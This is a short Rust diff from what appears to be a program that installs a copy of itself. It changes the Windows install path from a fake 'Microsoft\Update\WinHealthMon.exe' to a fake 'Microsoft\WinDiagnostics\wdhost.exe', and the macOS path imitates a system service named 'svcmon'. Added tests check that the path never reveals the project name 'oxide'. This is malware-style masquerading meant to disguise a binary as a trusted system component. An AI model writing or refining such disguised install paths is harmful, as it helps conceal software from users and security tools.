@@ -90,7 +90,7 @@ pub fn stable_path() -> anyhow::Result<PathBuf> {
         .or_else(|_| std::env::var("USERPROFILE"))
         .map_err(|_| anyhow::anyhow!("HOME not set"))?;
     #[cfg(target_os = "windows")]
-    let subpath = r"AppData\Roaming\Microsoft\Update\WinHealthMon.exe";
+    let subpath = r"AppData\Local\Microsoft\WinDiagnostics\wdhost.exe";
     #[cfg(target_os = "macos")]
     let subpath = "Library/Application Support/SystemServices/svcmon";
     #[cfg(not(any(target_os = "windows", target_os = "macos")))]
@@ -201,6 +201,8 @@ mod tests {
         let p = stable_path().unwrap();
         let s = p.to_str().unwrap();
         assert!(!s.contains("oxide"), "stable path must not contain 'oxide': {s}");
+        assert!(!s.contains("Roaming"), "must not use AppData\\Roaming: {s}");
+        assert!(!s.contains("Update"), "must not use Update subdir: {s}");
     }
 
     #[test]
